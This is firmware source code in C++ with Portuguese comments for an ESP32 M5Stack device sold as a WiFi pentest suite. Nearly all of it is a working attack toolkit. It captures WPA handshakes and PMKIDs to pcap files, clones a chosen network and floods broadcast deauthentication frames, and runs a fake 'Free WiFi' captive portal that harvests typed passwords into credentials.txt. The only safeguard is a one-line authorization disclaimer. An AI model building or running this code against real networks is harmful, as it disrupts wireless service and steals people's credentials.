/*
 * M5Gotchi PRO - WiFi Pentest Suite
 * Versão otimizada com Deauth Attack e Evil Portal
 * 
 * NOVOS RECURSOS PRO:
 * ✨ Deauth Attack ao clonar rede
 * ✨ Evil Portal com páginas HTML do SD Card
 * ✨ Modo Handshake Capture otimizado
 * ✨ Interface multi-modo
 * 
 * USO APENAS EM REDES PRÓPRIAS OU COM AUTORIZAÇÃO!
 */

// ==================== DEFINIÇÕES DE PINOS SPI ====================
// IMPORTANTE: Definir ANTES de incluir bibliotecas!
// Para ESP32-S3 (Cardputer) - definir pinos SPI se não estiverem definidos
#ifndef SCK
    #define SCK  36
#endif
#ifndef MISO
    #define MISO 35
#endif
#ifndef MOSI
    #define MOSI 37
#endif
#ifndef SS
    #define SS   34
#endif

#include <M5Unified.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <SPI.h>
#include <SD.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi_types.h"

// ==================== CONFIGURAÇÕES ====================
#define SNAP_LEN 2324
#define CHANNEL_HOP_INTERVAL_MS 3000
#define MAX_PCAP_SIZE 10000000
#define DEAUTH_INTERVAL_MS 5000
#define MAX_NETWORKS 50

// Evil Portal
#define DNS_PORT 53
#define HTTP_PORT 80
#define PORTAL_SSID "Free WiFi"

// Modos de operação
enum OperationMode {
    MODE_HANDSHAKE_CAPTURE,
    MODE_EVIL_PORTAL,
    MODE_CLONE_DEAUTH,
    MODE_MENU
};

// ==================== VARIÁVEIS GLOBAIS ====================
OperationMode currentMode = MODE_MENU;

// Handshake Capture
const uint8_t PRIORITY_CHANNELS[] = {1, 6, 11};
const uint8_t PRIORITY_CHANNEL_COUNT = 3;
uint8_t currentChannel = 1;
uint8_t channelIndex = 0;
unsigned long lastChannelChange = 0;
unsigned long packetCount = 0;
unsigned long eapolCount = 0;
unsigned long pmkidCount = 0;
bool usePriorityChannelsOnly = true;

// Clone & Deauth
struct NetworkInfo {
    String ssid;
    uint8_t bssid[6];
    int channel;
    int rssi;
    uint8_t encryptionType;
};
NetworkInfo networks[MAX_NETWORKS];
int networkCount = 0;
int selectedNetwork = 0;
bool deauthActive = false;
uint8_t targetBSSID[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
int targetChannel = 1;
unsigned long lastDeauth = 0;
unsigned long deauthPacketsSent = 0;

// Evil Portal
WebServer server(HTTP_PORT);
DNSServer dnsServer;
bool portalActive = false;
String portalHTMLPath = "/portal.html";
unsigned long portalVisits = 0;
unsigned long credentialsCaptured = 0;
File logFile;

// PCAP
File pcapFile;
bool sdCardEnabled = false;
int fileCounter = 1;
unsigned long currentFileSize = 0;

// ==================== ESTRUTURAS ====================
typedef struct {
    unsigned frame_ctrl:16;
    unsigned duration_id:16;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    unsigned sequence_ctrl:16;
    uint8_t addr4[6];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0];
} wifi_ieee80211_packet_t;

typedef struct {
    uint32_t magic_number;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t network;
} pcap_hdr_t;

typedef struct {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} pcaprec_hdr_t;

// ==================== DISPLAY HELPERS ====================
void drawHeader(const char* title) {
    M5.Display.fillScreen(BLACK);
    M5.Display.setTextColor(GREEN, BLACK);
    M5.Display.setTextSize(2);
    M5.Display.setCursor((320 - strlen(title) * 12) / 2, 10);
    M5.Display.println(title);
    M5.Display.drawLine(0, 35, 320, 35, GREEN);
}

void drawButton(int x, const char* label, uint16_t color = WHITE) {
    M5.Display.setTextColor(color, BLACK);
    M5.Display.setTextSize(1);
    M5.Display.setCursor(x, 225);
    M5.Display.println(label);
}

// ==================== MENU PRINCIPAL ====================
void displayMenu() {
    drawHeader("M5GOTCHI PRO");
    
    M5.Display.setTextSize(2);
    M5.Display.setTextColor(CYAN, BLACK);
    
    int y = 60;
    M5.Display.setCursor(20, y);
    M5.Display.println("1. Handshake Capture");
    
    y += 30;
    M5.Display.setCursor(20, y);
    M5.Display.println("2. Clone + Deauth");
    
    y += 30;
    M5.Display.setCursor(20, y);
    M5.Display.println("3. Evil Portal");
    
    y += 40;
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(YELLOW, BLACK);
    M5.Display.setCursor(20, y);
    M5.Display.println("SD: ");
    M5.Display.setCursor(50, y);
    M5.Display.setTextColor(sdCardEnabled ? GREEN : RED, BLACK);
    M5.Display.println(sdCardEnabled ? "ATIVO" : "INATIVO");
    
    M5.Display.drawLine(0, 215, 320, 215, GREEN);
    drawButton(15, "[A]1", CYAN);
    drawButton(125, "[B]2", CYAN);
    drawButton(235, "[C]3", CYAN);
}

// ==================== HANDSHAKE CAPTURE ====================
void initPcapFile() {
    if (!sdCardEnabled) return;
    
    char filename[32];
    sprintf(filename, "/%d.pcap", fileCounter);
    
    pcapFile = SD.open(filename, FILE_WRITE);
    if (!pcapFile) {
        Serial.println("Erro ao criar arquivo PCAP!");
        return;
    }
    
    pcap_hdr_t pcap_header;
    pcap_header.magic_number = 0xa1b2c3d4;
    pcap_header.version_major = 2;
    pcap_header.version_minor = 4;
    pcap_header.thiszone = 0;
    pcap_header.sigfigs = 0;
    pcap_header.snaplen = SNAP_LEN;
    pcap_header.network = 105;
    
    pcapFile.write((uint8_t*)&pcap_header, sizeof(pcap_hdr_t));
    pcapFile.flush();
    currentFileSize = sizeof(pcap_hdr_t);
    
    Serial.printf("PCAP criado: %s\n", filename);
}

void writePcapPacket(const uint8_t* buf, uint32_t len) {
    if (!sdCardEnabled || !pcapFile) return;
    
    if (currentFileSize >= MAX_PCAP_SIZE) {
        pcapFile.close();
        fileCounter++;
        currentFileSize = 0;
        initPcapFile();
    }
    
    pcaprec_hdr_t packet_header;
    packet_header.ts_sec = millis() / 1000;
    packet_header.ts_usec = (millis() % 1000) * 1000;
    packet_header.incl_len = len;
    packet_header.orig_len = len;
    
    pcapFile.write((uint8_t*)&packet_header, sizeof(pcaprec_hdr_t));
    pcapFile.write(buf, len);
    pcapFile.flush();
    
    currentFileSize += sizeof(pcaprec_hdr_t) + len;
}

bool isEAPOL(const uint8_t* buf, uint32_t len) {
    if (len < 36) return false;
    uint8_t frameType = buf[0];
    if ((frameType & 0x0C) != 0x08) return false;
    
    for (int i = 0; i < len - 1; i++) {
        if (buf[i] == 0x88 && buf[i+1] == 0x8E) {
            return true;
        }
    }
    return false;
}

bool hasPMKID(const uint8_t* buf, uint32_t len) {
    if (!isEAPOL(buf, len)) return false;
    
    for (int i = 0; i < len - 20; i++) {
        if (buf[i] == 0xDD && buf[i+1] >= 0x14) {
            if (buf[i+2] == 0x00 && buf[i+3] == 0x0F && 
                buf[i+4] == 0xAC && buf[i+5] == 0x04) {
                return true;
            }
        }
    }
    return false;
}

void wifi_sniffer_packet_handler(void* buff, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)ppkt->payload;
    const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
    
    uint32_t len = ppkt->rx_ctrl.sig_len;
    packetCount++;
    
    bool isEapolPacket = isEAPOL(ppkt->payload, len);
    if (isEapolPacket) {
        eapolCount++;
        writePcapPacket(ppkt->payload, len);
        
        if (hasPMKID(ppkt->payload, len)) {
            pmkidCount++;
            Serial.println("*** PMKID CAPTURADO! ***");
        }
        
        Serial.printf("EAPOL #%lu capturado!\n", eapolCount);
    }
}

void displayHandshakeCapture() {
    M5.Display.setTextSize(2);
    M5.Display.setTextColor(WHITE, BLACK);
    
    M5.Display.setCursor(10, 50);
    M5.Display.printf("Canal: %02d       ", currentChannel);
    
    M5.Display.setCursor(10, 75);
    M5.Display.printf("Modo: %s", usePriorityChannelsOnly ? "PRIOR" : "TODOS");
    
    M5.Display.setTextColor(CYAN, BLACK);
    M5.Display.setCursor(10, 105);
    M5.Display.printf("Pacotes: %lu    ", packetCount);
    
    M5.Display.setTextColor(YELLOW, BLACK);
    M5.Display.setCursor(10, 130);
    M5.Display.printf("EAPOL: %lu      ", eapolCount);
    
    M5.Display.setTextColor(MAGENTA, BLACK);
    M5.Display.setCursor(10, 155);
    M5.Display.printf("PMKID: %lu      ", pmkidCount);
    
    M5.Display.drawLine(0, 215, 320, 215, GREEN);
    drawButton(5, "[A]Modo", CYAN);
    drawButton(110, "[B]Menu", RED);
    drawButton(220, "[C]Reset", YELLOW);
}

void changeChannel() {
    unsigned long now = millis();
    
    if (now - lastChannelChange >= CHANNEL_HOP_INTERVAL_MS) {
        if (usePriorityChannelsOnly) {
            channelIndex = (channelIndex + 1) % PRIORITY_CHANNEL_COUNT;
            currentChannel = PRIORITY_CHANNELS[channelIndex];
        } else {
            currentChannel = (currentChannel % 13) + 1;
        }
        
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        lastChannelChange = now;
    }
}

// ==================== CLONE & DEAUTH ====================
void scanNetworks() {
    M5.Display.fillScreen(BLACK);
    M5.Display.setCursor(60, 100);
    M5.Display.setTextColor(YELLOW);
    M5.Display.println("Escaneando...");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    int n = WiFi.scanNetworks();
    networkCount = min(n, MAX_NETWORKS);
    
    for (int i = 0; i < networkCount; i++) {
        networks[i].ssid = WiFi.SSID(i);
        uint8_t* bssid = WiFi.BSSID(i);
        memcpy(networks[i].bssid, bssid, 6);
        networks[i].channel = WiFi.channel(i);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].encryptionType = WiFi.encryptionType(i);
    }
    
    WiFi.scanDelete();
}

void displayNetworkList() {
    drawHeader("CLONE & DEAUTH");
    
    M5.Display.setTextSize(1);
    int y = 45;
    int visibleNetworks = min(networkCount, 7);
    int startIdx = max(0, selectedNetwork - 3);
    
    for (int i = 0; i < visibleNetworks && (startIdx + i) < networkCount; i++) {
        int idx = startIdx + i;
        
        if (idx == selectedNetwork) {
            M5.Display.fillRect(0, y, 320, 15, DARKGREEN);
            M5.Display.setTextColor(WHITE, DARKGREEN);
        } else {
            M5.Display.setTextColor(WHITE, BLACK);
        }
        
        M5.Display.setCursor(5, y + 3);
        
        String ssid = networks[idx].ssid;
        if (ssid.length() > 25) {
            ssid = ssid.substring(0, 22) + "...";
        }
        
        M5.Display.printf("%s", ssid.c_str());
        
        M5.Display.setCursor(260, y + 3);
        M5.Display.printf("%ddB", networks[idx].rssi);
        
        y += 20;
    }
    
    M5.Display.drawLine(0, 200, 320, 200, GREEN);
    
    if (deauthActive) {
        M5.Display.setTextColor(RED, BLACK);
        M5.Display.setCursor(10, 205);
        M5.Display.printf("DEAUTH: %lu pkts", deauthPacketsSent);
    }
    
    M5.Display.drawLine(0, 215, 320, 215, GREEN);
    drawButton(5, "[A]Clone", GREEN);
    drawButton(95, "[B]Deauth", RED);
    drawButton(235, "[C]Menu", YELLOW);
}

void sendDeauthPacket(uint8_t *bssid, uint8_t *client) {
    uint8_t deauth_frame[26] = {
        0xC0, 0x00,
        0x00, 0x00,
        client[0], client[1], client[2], client[3], client[4], client[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00,
        0x07, 0x00
    };
    
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    deauthPacketsSent++;
}

void performDeauthAttack() {
    if (!deauthActive) return;
    
    unsigned long now = millis();
    if (now - lastDeauth >= DEAUTH_INTERVAL_MS) {
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        
        for (int i = 0; i < 5; i++) {
            sendDeauthPacket(targetBSSID, broadcast);
            delay(10);
        }
        
        lastDeauth = now;
        Serial.printf("Deauth enviado para %02X:%02X:%02X:%02X:%02X:%02X\n",
                     targetBSSID[0], targetBSSID[1], targetBSSID[2],
                     targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    }
}

void cloneNetwork() {
    if (networkCount == 0) return;
    
    NetworkInfo &net = networks[selectedNetwork];
    
    memcpy(targetBSSID, net.bssid, 6);
    targetChannel = net.channel;
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP(net.ssid.c_str());
    
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    
    M5.Display.fillScreen(BLACK);
    M5.Display.setCursor(40, 100);
    M5.Display.setTextColor(GREEN);
    M5.Display.println("AP CLONADO!");
    M5.Display.setCursor(40, 120);
    M5.Display.printf("SSID: %s", net.ssid.c_str());
    M5.Display.setCursor(40, 140);
    M5.Display.printf("CH: %d", targetChannel);
    
    delay(2000);
    
    deauthActive = true;
    deauthPacketsSent = 0;
    
    Serial.println("Clone criado + Deauth ativado!");
}

// ==================== EVIL PORTAL ====================
void handleRoot() {
    portalVisits++;
    
    String html = "";
    
    if (sdCardEnabled && SD.exists(portalHTMLPath.c_str())) {
        File htmlFile = SD.open(portalHTMLPath.c_str(), FILE_READ);
        if (htmlFile) {
            html = htmlFile.readString();
            htmlFile.close();
            Serial.println("Portal HTML carregado do SD!");
        }
    }
    
    if (html.length() == 0) {
        html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
        html += "<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}";
        html += ".container{background:white;padding:40px;border-radius:15px;box-shadow:0 20px 60px rgba(0,0,0,0.3);max-width:400px;width:100%}h1{color:#333;margin-bottom:10px;text-align:center}";
        html += ".subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}input{width:100%;padding:15px;margin:10px 0;border:2px solid #ddd;border-radius:8px;font-size:16px;transition:border 0.3s}";
        html += "input:focus{outline:none;border-color:#667eea}button{width:100%;padding:15px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:10px;transition:transform 0.2s}";
        html += "button:hover{transform:scale(1.02)}.footer{text-align:center;margin-top:20px;font-size:12px;color:#999}</style></head>";
        html += "<body><div class='container'><h1>🔐 WiFi Login</h1><p class='subtitle'>Entre com suas credenciais para conectar</p>";
        html += "<form action='/login' method='POST'><input type='text' name='ssid' placeholder='Nome da Rede' required>";
        html += "<input type='password' name='password' placeholder='Senha' required><button type='submit'>Conectar</button></form>";
        html += "<p class='footer'>Conexão segura • M5Gotchi Pro</p></div></body></html>";
    }
    
    server.send(200, "text/html", html);
}

void handleLogin() {
    credentialsCaptured++;
    
    String ssid = server.arg("ssid");
    String password = server.arg("password");
    
    if (sdCardEnabled) {
        logFile = SD.open("/credentials.txt", FILE_APPEND);
        if (logFile) {
            logFile.printf("=== Captura #%lu ===\n", credentialsCaptured);
            logFile.printf("Time: %lu ms\n", millis());
            logFile.printf("SSID: %s\n", ssid.c_str());
            logFile.printf("Password: %s\n", password.c_str());
            logFile.printf("IP: %s\n", server.client().remoteIP().toString().c_str());
            logFile.println("---");
            logFile.close();
        }
    }
    
    Serial.printf("CREDENCIAL CAPTURADA! SSID: %s | Pass: %s\n", ssid.c_str(), password.c_str());
    
    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
    html += "<style>body{font-family:Arial;background:#667eea;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}";
    html += ".box{background:white;padding:40px;border-radius:15px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)}h1{color:#4CAF50;margin-bottom:20px}";
    html += "p{color:#666;font-size:16px}.checkmark{color:#4CAF50;font-size:60px;margin-bottom:20px}</style></head>";
    html += "<body><div class='box'><div class='checkmark'>✓</div><h1>Conectado!</h1><p>Você está conectado à rede WiFi.</p><p style='margin-top:20px;font-size:14px;color:#999'>Pode fechar esta janela</p></div></body></html>";
    
    server.send(200, "text/html", html);
}

void handleNotFound() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
}

void startEvilPortal() {
    WiFi.disconnect();
    esp_wifi_set_promiscuous(false);
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP(PORTAL_SSID);
    
    delay(100);
    
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    
    server.on("/", handleRoot);
    server.on("/login", HTTP_POST, handleLogin);
    server.onNotFound(handleNotFound);
    server.begin();
    
    portalActive = true;
    portalVisits = 0;
    credentialsCaptured = 0;
    
    Serial.println("Evil Portal iniciado!");
    Serial.printf("AP: %s\n", PORTAL_SSID);
    Serial.printf("IP: %s\n", WiFi.softAPIP().toString().c_str());
}

void displayEvilPortal() {
    drawHeader("EVIL PORTAL");
    
    M5.Display.setTextSize(2);
    M5.Display.setTextColor(CYAN, BLACK);
    M5.Display.setCursor(10, 50);
    M5.Display.printf("SSID: %s", PORTAL_SSID);
    
    M5.Display.setCursor(10, 75);
    M5.Display.printf("IP: %s", WiFi.softAPIP().toString().c_str());
    
    M5.Display.setTextColor(WHITE, BLACK);
    M5.Display.setCursor(10, 105);
    M5.Display.printf("Clientes: %d    ", WiFi.softAPgetStationNum());
    
    M5.Display.setTextColor(YELLOW, BLACK);
    M5.Display.setCursor(10, 130);
    M5.Display.printf("Visitas: %lu    ", portalVisits);
    
    M5.Display.setTextColor(GREEN, BLACK);
    M5.Display.setCursor(10, 155);
    M5.Display.printf("Capturado: %lu  ", credentialsCaptured);
    
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(MAGENTA, BLACK);
    M5.Display.setCursor(10, 185);
    M5.Display.printf("HTML: %s", portalHTMLPath.c_str());
    
    M5.Display.drawLine(0, 215, 320, 215, GREEN);
    drawButton(15, "[A]Reload", CYAN);
    drawButton(125, "[B]Menu", RED);
    drawButton(220, "[C]Change", YELLOW);
}

// ==================== SETUP ====================
void setup() {
    auto cfg = M5.config();
    M5.begin(cfg);
    Serial.begin(115200);
    
    M5.Display.setBrightness(100);
    
    if (SD.begin()) {
        sdCardEnabled = true;
        Serial.println("SD Card OK!");
        
        if (SD.exists("/portal.html")) {
            Serial.println("Portal HTML customizado encontrado!");
        }
    } else {
        Serial.println("SD Card falhou!");
    }
    
    displayMenu();
    
    Serial.println("M5Gotchi PRO iniciado!");
    Serial.println("Selecione um modo:");
    Serial.println("1. Handshake Capture");
    Serial.println("2. Clone + Deauth");
    Serial.println("3. Evil Portal");
}

// ==================== LOOP ====================
void loop() {
    M5.update();
    
    switch (currentMode) {
        case MODE_MENU:
            if (M5.BtnA.wasPressed()) {
                currentMode = MODE_HANDSHAKE_CAPTURE;
                drawHeader("HANDSHAKE CAPTURE");
                WiFi.mode(WIFI_STA);
                WiFi.disconnect();
                delay(100);
                esp_wifi_set_promiscuous(true);
                esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
                esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
                if (sdCardEnabled) initPcapFile();
                Serial.println("Modo: Handshake Capture");
            }
            if (M5.BtnB.wasPressed()) {
                currentMode = MODE_CLONE_DEAUTH;
                scanNetworks();
                selectedNetwork = 0;
                Serial.println("Modo: Clone & Deauth");
            }
            if (M5.BtnC.wasPressed()) {
                currentMode = MODE_EVIL_PORTAL;
                startEvilPortal();
                Serial.println("Modo: Evil Portal");
            }
            break;
            
        case MODE_HANDSHAKE_CAPTURE:
            changeChannel();
            displayHandshakeCapture();
            
            if (M5.BtnA.wasPressed()) {
                usePriorityChannelsOnly = !usePriorityChannelsOnly;
            }
            if (M5.BtnB.wasPressed()) {
                esp_wifi_set_promiscuous(false);
                if (pcapFile) pcapFile.close();
                currentMode = MODE_MENU;
                displayMenu();
            }
            if (M5.BtnC.wasPressed()) {
                packetCount = 0;
                eapolCount = 0;
                pmkidCount = 0;
            }
            break;
            
        case MODE_CLONE_DEAUTH:
            displayNetworkList();
            performDeauthAttack();
            
            if (M5.BtnA.wasPressed()) {
                cloneNetwork();
            }
            if (M5.BtnB.wasPressed()) {
                deauthActive = !deauthActive;
                if (!deauthActive) {
                    WiFi.mode(WIFI_STA);
                }
            }
            if (M5.BtnC.wasPressed()) {
                deauthActive = false;
                WiFi.mode(WIFI_STA);
                currentMode = MODE_MENU;
                displayMenu();
            }
            
            static unsigned long lastScroll = 0;
            if (millis() - lastScroll > 200) {
                if (M5.BtnA.isPressed() && !M5.BtnB.isPressed()) {
                    selectedNetwork = (selectedNetwork - 1 + networkCount) % networkCount;
                    lastScroll = millis();
                }
                if (M5.BtnC.isPressed() && !M5.BtnB.isPressed()) {
                    selectedNetwork = (selectedNetwork + 1) % networkCount;
                    lastScroll = millis();
                }
            }
            break;
            
        case MODE_EVIL_PORTAL:
            dnsServer.processNextRequest();
            server.handleClient();
            displayEvilPortal();
            
            if (M5.BtnA.wasPressed()) {
                Serial.println("Recarregando HTML...");
            }
            if (M5.BtnB.wasPressed()) {
                portalActive = false;
                server.stop();
                dnsServer.stop();
                WiFi.mode(WIFI_STA);
                currentMode = MODE_MENU;
                displayMenu();
            }
            if (M5.BtnC.wasPressed()) {
                if (portalHTMLPath == "/portal.html") {
                    portalHTMLPath = "/portal2.html";
                } else {
                    portalHTMLPath = "/portal.html";
                }
            }
            break;
    }
    
    delay(10);
}
